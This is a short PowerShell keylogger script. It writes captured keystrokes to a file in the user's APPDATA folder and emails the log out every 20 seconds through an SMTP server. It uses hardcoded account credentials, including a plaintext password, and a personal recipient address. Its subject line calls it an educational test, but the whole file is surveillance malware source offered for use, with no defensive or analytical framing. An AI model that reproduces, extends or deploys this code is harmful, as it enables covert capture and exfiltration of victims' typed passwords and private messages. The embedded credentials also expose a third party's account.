Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$logPath = "$env:APPDATA\keylog.txt"
$global:log = ""

function Start-Keylogger {
    $form = New-Object Windows.Forms.Form
    $form.KeyPreview = $true
    $form.Add_KeyDown({
        param($sender, $e)
        $key = $e.KeyCode.ToString()
        $global:log += "$key "
        Set-Content -Path $logPath -Value $global:log
    })
    $null = $form.ShowDialog()
}

function Send-Email {
    $smtpServer = "smtp.poczta.onet.pl"
    $smtpPort = 587
    $smtpUser = "darmaff@op.pl"
    $smtpPass = "Y%$AhtJN!4iZVDk"

    $msg = New-Object System.Net.Mail.MailMessage
    $msg.From = $smtpUser
    $msg.To.Add("przemekparuwa@gmail.com")
    $msg.Subject = "Keylog - test edukacyjny"
    $msg.Body = Get-Content $logPath -Raw

    $smtp = New-Object Net.Mail.SmtpClient($smtpServer, $smtpPort)
    $smtp.EnableSsl = $true
    $smtp.Credentials = New-Object System.Net.NetworkCredential($smtpUser, $smtpPass)
    $smtp.Send($msg)
}

Start-Job -ScriptBlock { Start-Keylogger }

while ($true) {
    Start-Sleep -Seconds 20
    Send-Email
}
